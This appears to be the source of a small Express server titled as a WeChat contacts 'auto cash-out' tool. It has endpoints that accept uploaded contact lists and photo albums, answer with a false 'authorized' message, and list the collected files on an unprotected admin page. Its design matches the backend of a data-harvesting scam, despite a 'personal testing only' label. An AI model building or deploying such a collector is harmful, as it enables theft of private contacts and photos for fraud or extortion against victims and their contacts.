const express = require('express')
const cors = require('cors')
const multer = require('multer')
const fs = require('fs')
const app = express()
const port = process.env.PORT || 3000

app.use(cors())
app.use(express.json())
// 绑定前端文件夹 page
app.use(express.static('page'))

const upload = multer({dest:'fileData/'})
if(!fs.existsSync('fileData')) fs.mkdirSync('fileData')

// 载入基础设置接口
app.get('/api/baseLoad',(req,res)=>{
    res.json({
        title:"微信通讯录自动跑现",
        state:"基础配置载入成功",
        tip:"仅个人测试使用"
    })
})

// 接收通讯录
app.post('/api/saveTel',upload.single('telFile'),(req,res)=>{
    res.json({code:200,msg:"1已授权"})
})

// 接收相册
app.post('/api/saveImg',upload.single('imgFile'),(req,res)=>{
    res.json({code:200,msg:"2已授权"})
})

// 后台查看
app.get('/api/adminData',(req,res)=>{
    let list = fs.existsSync('fileData') ? fs.readdirSync('fileData') : []
    let html = `<h2>后台数据中心</h2><p>共${list.length}条数据</p><ul>`
    list.forEach(v=>html+=`<li>${v}</li>`)
    html += `</ul>`
    res.send(html)
})

app.listen(port,()=>{
    console.log('服务正常运行')
})